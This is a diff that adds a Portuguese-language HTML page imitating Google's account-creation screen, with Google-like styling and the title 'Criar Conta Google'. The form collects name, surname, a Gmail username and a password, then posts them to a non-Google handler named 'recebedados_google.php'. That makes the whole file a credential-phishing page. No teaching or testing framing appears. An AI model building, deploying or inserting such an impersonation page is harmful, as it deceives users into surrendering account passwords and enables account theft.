@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Criar Conta Google</title>
+    <style>
+        body {
+            font-family: Roboto, Arial, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .form-container {
+            background-color: white;
+            padding: 40px 30px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            width: 400px;
+            max-width: 90%;
+        }
+
+        h2 {
+            font-weight: normal;
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+
+        p {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .row input {
+            flex: 1;
+        }
+
+        input[type="submit"] {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #1967d2;
+        }
+
+        .footer {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #5f6368;
+            text-align: center;
+        }
+
+    </style>
+</head>
+<body>
+
+<div class="form-container">
+    <h2>Criar sua Conta do Google</h2>
+    <p>Preencha os campos abaixo para continuar</p>
+    <form method="post" action="recebedados_google.php">
+        <div class="row">
+            <input type="text" name="nome" placeholder="Nome" required>
+            <input type="text" name="sobrenome" placeholder="Sobrenome" required>
+        </div>
+        <input type="email" name="usuario" placeholder="Nome de usuário (ex: voce@gmail.com)" required>
+        <input type="password" name="senha" placeholder="Senha" required>
+        <input type="password" name="confirmar_senha" placeholder="Confirmar senha" required>
+
+        <input type="submit" value="Próxima">
+    </form>
+
+    <div class="footer">
+        <p>Já tem uma conta? <a href="#">Fazer login</a></p>
+    </div>
+</div>
+
+</body>
+</html>
